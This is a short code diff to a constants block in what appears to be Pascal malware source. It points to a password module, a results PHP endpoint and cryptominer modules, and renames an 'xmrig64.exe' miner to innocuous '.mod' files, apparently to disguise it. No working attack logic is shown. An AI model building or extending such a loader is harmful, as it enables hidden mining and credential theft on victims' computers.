@@ -30,7 +30,8 @@ const
   ResultsPHP  = '/result.php';
   PassModule  = '/modules/Pass.mod';
   MineConfig  = '/modules/config.json';
-  MineModule  = '/modules/xmrig64.exe';
+  MineModule  = '/modules/Mine.mod';
+  MineModule64= '/modules/Mine64.mod';
 
 var
   Net: TNet;
